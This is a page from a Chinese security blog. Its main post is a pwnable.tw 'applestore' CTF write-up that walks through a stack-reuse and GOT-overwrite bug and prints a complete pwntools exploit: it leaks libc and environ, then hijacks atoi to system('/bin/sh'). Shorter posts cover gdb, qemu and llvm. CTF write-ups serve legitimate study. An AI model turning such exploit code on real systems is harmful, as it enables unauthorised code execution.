<!DOCTYPE html>












  


<html class="theme-next muse use-motion" lang="default">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
































<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=6.6.0" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.6.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.6.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.6.0">


  <link rel="mask-icon" href="/images/logo.svg?v=6.6.0" color="#222">









<script id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '6.6.0',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta property="og:type" content="website">
<meta property="og:title" content="PCB博客">
<meta property="og:url" content="http://bin2415.github.io/page/2/index.html">
<meta property="og:site_name" content="PCB博客">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="PCB博客">



  <link rel="alternate" href="/atom.xml" title="PCB博客" type="application/atom+xml">




  <link rel="canonical" href="http://bin2415.github.io/page/2/">



<script id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>PCB博客</title>
  












  <noscript>
  <style>
    .use-motion .motion-element,
    .use-motion .brand,
    .use-motion .menu-item,
    .sidebar-inner,
    .use-motion .post-block,
    .use-motion .pagination,
    .use-motion .comments,
    .use-motion .post-header,
    .use-motion .post-body,
    .use-motion .collection-title { opacity: initial; }

    .use-motion .logo,
    .use-motion .site-title,
    .use-motion .site-subtitle {
      opacity: initial;
      top: initial;
    }

    .use-motion .logo-line-before i { left: initial; }
    .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">PCB博客</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
      
        <p class="site-subtitle">快乐记录每一天</p>
      
    
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">

    
    
    
      
    

    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">

    
    
    
      
    

    

    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">

    
    
    
      
    

    

    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">

    
    
    
      
    

    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>

  </li>

      
      
    </ul>
  

  
    

  

  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://bin2415.github.io/2018/07/01/pwnable-tw/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="binpang">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PCB博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2018/07/01/pwnable-tw/" class="post-title-link" itemprop="http://bin2415.github.io/page/2/index.html">pwnable.tw之applestore</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-07-01 16:50:23" itemprop="dateCreated datePublished" datetime="2018-07-01T16:50:23+08:00">2018-07-01</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2018-12-23 13:33:53" itemprop="dateModified" datetime="2018-12-23T13:33:53+08:00">2018-12-23</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/pwnable/" itemprop="url" rel="index"><span itemprop="name">pwnable</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>该题是模拟了apple的商店，来售卖apple的各种产品，其提供了6个功能:</p>
<ul>
<li>1: 展示商店的商品</li>
<li>2: 添加商品到购物车</li>
<li>3: 从购物车里面将某一商品删除</li>
<li>4: 展示购物车里面的商品</li>
<li>5: 结算</li>
<li>6: 退出</li>
</ul>
<p>其中，购物车是用双向链表实现的，其每一项的结构如下，其在32位机器下的大小为16字节。链表头是一个全局变量，存在0x804b068处。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cart_entry</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span>* product_name,</span><br><span class="line">    <span class="keyword">int</span> price,</span><br><span class="line">    cart_entry* next,</span><br><span class="line">    cart_entry* previous</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>下面简单的分析添加，删除，购物车输出和结算功能。</p>
<h3 id="添加商品"><a href="#添加商品" class="headerlink" title="添加商品"></a>添加商品</h3><p>添加商品是在add()函数中实现的，其在ida中反汇编出来的结果如下图所示：</p>
<p><img src="/2018/07/01/pwnable-tw/./add_all.png" alt="add_all"></p>
<p>该函数的逻辑也比较简单，其首先通过malloc在堆上分配16自己大小的空间，然后进行初始化，最后将该结构体添加到双向链表中。</p>
<h3 id="结算"><a href="#结算" class="headerlink" title="结算"></a>结算</h3><p>结算功能是在checkout()函数中实现的，其在ida中反汇编出来的结果如下图所示:</p>
<p><img src="/2018/07/01/pwnable-tw/./checkout.png" alt="checkout"></p>
<p>由上图可知，其当满足总金额=7174时，则将一个临时变量v2(位于ebp-0x20)加入到双向链表中，而ebp-0x20处的内存如果能被我们所控制的话就可能进行攻击(泄露内存等)。而通过分析可知在cart()函数接收输入的时候我们的输入是能够覆盖到ebp-0x20处的。所以此时只需要满足购物车的总金额=7174即可。我们观察到一共有4种不同的价格(199,299,399,499),我们可以列个方程求出多种解。最直接的方法是交给<a href="https://github.com/Z3Prover/z3" target="_blank" rel="noopener">z3</a>求解器，具体求解如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">In [<span class="number">1</span>]: <span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">In [<span class="number">2</span>]: x = Int(<span class="string">'x'</span>)</span><br><span class="line">In [<span class="number">3</span>]: y = Int(<span class="string">'y'</span>)</span><br><span class="line">In [<span class="number">4</span>]: m = Int(<span class="string">'m'</span>)</span><br><span class="line">In [<span class="number">5</span>]: n = Int(<span class="string">'n'</span>)</span><br><span class="line">In [<span class="number">7</span>]: solve(x&gt;=<span class="number">0</span>,y&gt;=<span class="number">0</span>,m&gt;=<span class="number">0</span>,n&gt;=<span class="number">0</span>,<span class="number">199</span>*x+<span class="number">299</span>*y+<span class="number">399</span>*m+<span class="number">499</span>*n==<span class="number">7174</span>)</span><br><span class="line">[y = <span class="number">20</span>, x = <span class="number">6</span>, n = <span class="number">0</span>, m = <span class="number">0</span>]</span><br></pre></td></tr></table></figure>
<p>即可求出结果，使得满足购物车总金额=7174.</p>
<h3 id="输出购物车"><a href="#输出购物车" class="headerlink" title="输出购物车"></a>输出购物车</h3><p>输出购物车功能是在cart()函数中实现的，其在ida中反汇编出来的结果如下图所示：</p>
<p><img src="/2018/07/01/pwnable-tw/./cart.png" alt="cart"></p>
<p>在cart()函数中，有一个可以利用的地方就是在my_read()时，用户能输入0x15大小的数据，而输入的数据存进的内存即在ebp-0x22开始处，正好可以将checkout中的添加到双向链表的临时变量(ebp-0x20)给覆盖掉。如果我们将临时变量的第一个元素(存放商品名称)的地方存入atoi的got地址，则可以将libc的地址泄露出来。</p>
<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p>删除功能是在delete()函数中实现的，其在ida中反汇编出来的结果如下图所示:</p>
<p><img src="/2018/07/01/pwnable-tw/./pwnable-tw/delete.png" alt="delete"></p>
<p>删除操作就是在双向链表中找到要删除的项，然后就是正规的双向链表操作。由于我们可以通过输入控制ebp-0x20处的项的数据，如果我们将next和previous元素修改成特定的值，就有可能修改got表项，此时就造成了控制流的劫持。一开始我是将next修改成got[‘atoi’]-0xc，将previous改成system的地址，最后发生segment fault. 仔细一想，此时确实将atoi的got表项改成了system的地址了，但是也需要将system.addr+8赋值为got[‘atoi’]-0xc，而system.addr+8处是代码段，改程序又开了NX保护，所以会发生segment fault.</p>
<h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><p>通过前面的分析，我们可以利用cart()函数覆盖ebp-0x20处的内容，进而可以进行内存泄露攻击，将glibc的地址和栈中的地址泄露出来。通过delete函数，我们可以修改某一内存处的内容，如果我们修改ebp的值，使其在leave操作(mov esp, ebp; pop ebp)时，将修改后的ebp值赋给ebp寄存器，从而控制栈，进而修改got表项。</p>
<h3 id="内存泄露"><a href="#内存泄露" class="headerlink" title="内存泄露"></a>内存泄露</h3><p>通过前面的分析我们可以看到在cart()函数中，如果将ebp-0x20处的内容覆盖为got[‘atoi’]的地址，则在cart函数输出的时候，就可以将atoi的got表项的内容泄露出来，即glibc的atoi函数的地址。</p>
<p>泄露栈中的地址，一开始没有思路，通过网上的write up，学到了一个方法：glibc有一个全局变量’environ’,该变量保存用户环境，其是一个char**类型，在程序运行时，将用户环境指向栈上，所以environ存储的地址就是栈上的地址，如果我们将environ变量的内容泄露出来也就泄露出来了栈上的地址。</p>
<h3 id="修改Got"><a href="#修改Got" class="headerlink" title="修改Got"></a>修改Got</h3><p>此前尝试直接将atoi的got表项改为system的地址会失败，通过查找write up发现有一个比较巧妙的方法: 通过修改子函数(delete函数)的saved ebp值为got[‘atoi’]+0x22的值，则返回delete函数到handle函数时，此时ebp即是got[‘atoi’]+0x22，此时通过my_read()函数将用户输入的值放入ebp-0x22处，即got[‘atoi’]，此时可以达到修改atoi的got表项的目的。而修改saved ebp值可以通过delete函数来实现。</p>
<h3 id="完整攻击"><a href="#完整攻击" class="headerlink" title="完整攻击"></a>完整攻击</h3><p>完整攻击代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">control ebp to control the stack, so can modify atoi got</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addDevice</span><span class="params">(device_num)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Device Number&gt;'</span>)</span><br><span class="line">    p.sendline(device_num)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkout</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'5'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'(y/n) &gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cart</span><span class="params">(payload)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'(y/n) &gt;'</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(payload)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Item Number&gt;'</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#p = process('./applestore', env=&#123;'LD_PRELOAD' : './libc_32.so.6'&#125;)</span></span><br><span class="line">    p = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10104</span>)</span><br><span class="line">    apple = ELF(<span class="string">'./applestore'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line">    <span class="comment">#print("pid : " + str(proc.pidof(p)))</span></span><br><span class="line">    <span class="comment">#raw_input('attach me ')</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">        addDevice(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        addDevice(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">    checkout()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak libc address</span></span><br><span class="line">    payload = <span class="string">'y\x00'</span> + p32(apple.got[<span class="string">'atoi'</span>]) + <span class="string">'\x00\x00\x00\x00'</span> * <span class="number">3</span></span><br><span class="line">    <span class="comment">#addDevice(payload)</span></span><br><span class="line">    cart(payload)</span><br><span class="line">    p.recvuntil(<span class="string">'27: '</span>)</span><br><span class="line">    atoi_addr = u32(p.recvline()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">    atoi_libc = libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">    libc_base = atoi_addr - atoi_libc</span><br><span class="line">    log.info(<span class="string">'atoi address is '</span> + hex(atoi_addr))</span><br><span class="line">    log.info(<span class="string">'atoi address in libc is '</span> + hex(atoi_libc))</span><br><span class="line">    log.info(<span class="string">'libc base address is '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">    libc.address = libc_base</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the stack address</span></span><br><span class="line">    environ_addr = libc.symbols[<span class="string">'environ'</span>]</span><br><span class="line">    payload = <span class="string">'y\x00'</span> + p32(environ_addr) + <span class="string">'\x00\x00\x00\x00'</span> * <span class="number">3</span></span><br><span class="line">    cart(payload)</span><br><span class="line">    p.recvuntil(<span class="string">'27: '</span>)</span><br><span class="line">    environ_addr = u32(p.recvline()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">    log.info(<span class="string">'environ address is '</span> + hex(environ_addr))</span><br><span class="line">    ebp_address = environ_addr - <span class="number">0x104</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># delete, write the ebp to the atoi+0x22</span></span><br><span class="line">    payload = <span class="string">'27'</span> + p32(<span class="number">0x08049002</span>) + p32(<span class="number">0</span>) + p32(apple.got[<span class="string">'atoi'</span>] + <span class="number">0x22</span>) + p32(ebp_address - <span class="number">0x8</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(p, '''</span></span><br><span class="line">    <span class="comment"># break *0x8048a3d</span></span><br><span class="line">    <span class="comment"># ''')</span></span><br><span class="line">    delete(payload)</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    <span class="comment"># attack, set the atoi got to system addr, and execute the system('/bin/sh')</span></span><br><span class="line">    payload = p32(libc.symbols[<span class="string">'system'</span>]) + <span class="string">';/bin/sh\x00'</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://bin2415.github.io/2018/01/22/gdb无法定位main/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="binpang">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PCB博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2018/01/22/gdb无法定位main/" class="post-title-link" itemprop="http://bin2415.github.io/page/2/index.html">gdb无法找到main</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-01-22 19:01:10" itemprop="dateCreated datePublished" datetime="2018-01-22T19:01:10+08:00">2018-01-22</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2018-12-23 13:33:53" itemprop="dateModified" datetime="2018-12-23T13:33:53+08:00">2018-12-23</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/gdb/" itemprop="url" rel="index"><span itemprop="name">gdb</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>最近在用gdb调试一个程序的时候，由于程序经过了strip处理，没有debug信息，所以当b main的时候会出现”Function main not defined”错误信息，也就是无法定位main函数。而当b <strong>libc_start_main函数时是可以定位到的，而</strong>libc_start_main函数的第一个参数就是main函数的地址，因此可以通过定位__libc_start_main函数，然后获得第一个参数的内容，此时就是main函数的地址。具体操作如下：</p>
<h2 id="传进-libc-start-main函数的参数"><a href="#传进-libc-start-main函数的参数" class="headerlink" title="传进__libc_start_main函数的参数"></a>传进__libc_start_main函数的参数</h2><p>查看汇编可以看到将__libc_start_main的第一个参数传进了$RDI寄存器中（64位机器）：</p>
<p><img src="/2018/01/22/gdb无法定位main/main_address.png" alt="first_param"></p>
<p>因此在gdb中先在<strong>libc_start_main函数下断点: ```b </strong>libc_start_main```</p>
<h2 id="在-RDI指向的内容处下断点"><a href="#在-RDI指向的内容处下断点" class="headerlink" title="在$RDI指向的内容处下断点"></a>在$RDI指向的内容处下断点</h2><p>在 <strong>libc_start_main处下了断点后，run一下会在</strong>libc_start_main入口处停下，此时$rdi寄存器存储的是main函数的地址，<code>b *$rdi</code>则会在main处下断点</p>
<p><img src="/2018/01/22/gdb无法定位main/rdi.png" alt="rdi"></p>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://bin2415.github.io/2018/01/14/qemu-mips/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="binpang">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PCB博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2018/01/14/qemu-mips/" class="post-title-link" itemprop="http://bin2415.github.io/page/2/index.html">Qemu模拟Mips程序运行</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-01-14 20:15:22" itemprop="dateCreated datePublished" datetime="2018-01-14T20:15:22+08:00">2018-01-14</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2018-12-23 13:33:53" itemprop="dateModified" datetime="2018-12-23T13:33:53+08:00">2018-12-23</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/qemu/" itemprop="url" rel="index"><span itemprop="name">qemu</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>使用Qemu可以运行不同环境的程序，比方说在i386架构下运行arm和mips架构的程序。</p>
<ul>
<li>安装Qemu<ul>
<li>sudo apt-get install qemu</li>
<li>sudo apt-get install qemu-user-static</li>
</ul>
</li>
<li>将qemu-mips-static文件拷贝到当前文件<ul>
<li>cp /usr/bin/qemu-mips-static ./</li>
</ul>
</li>
<li>运行mips程序(其中./bin/busybox为要执行的busybox)<ul>
<li>sudo chroot . ./qemu-mips-static ./bin/busybox</li>
</ul>
</li>
</ul>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://bin2415.github.io/2017/11/18/llvm存取fs段内容/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="binpang">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PCB博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2017/11/18/llvm存取fs段内容/" class="post-title-link" itemprop="http://bin2415.github.io/page/2/index.html">llvm存取fs段内容</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2017-11-18 10:26:29" itemprop="dateCreated datePublished" datetime="2017-11-18T10:26:29+08:00">2017-11-18</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2018-12-23 13:33:53" itemprop="dateModified" datetime="2018-12-23T13:33:53+08:00">2018-12-23</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/llvm/" itemprop="url" rel="index"><span itemprop="name">llvm</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>最近想使用llvm的pass来对每个函数进行插桩，来模拟stack guard的功能。其中碰到了一个很棘手的问题就是如何通过llvm C API实现对fs段内容的存取。要想实现该问题，我通过查看llvm如何实现stack guard,找到了具体的解决方案。下面首先看一下llvm中stackProtector pass如何实现对fs段的存取，然后再介绍一下我自己简化版本的Stack guard。</p>
<h2 id="stackProtector对fs段的存取"><a href="#stackProtector对fs段的存取" class="headerlink" title="stackProtector对fs段的存取"></a>stackProtector对fs段的存取</h2><p>在stackProtector中，调用getIRStackGuard(IRBuilder&lt;&gt; &amp;IRB) const函数对fs段进行存取的，其在x86下实现的具体代码如下:</p>
<p><img src="/2017/11/18/llvm存取fs段内容/fs_fetch.png" alt="fs_fetch"></p>
<p><img src="/2017/11/18/llvm存取fs段内容/fs_address.png" alt="fs_address"></p>
<p>其中fs段的addressSpace为257</p>
<h2 id="实现存取"><a href="#实现存取" class="headerlink" title="实现存取"></a>实现存取</h2><p>所以对fs段的存取代码如下:</p>
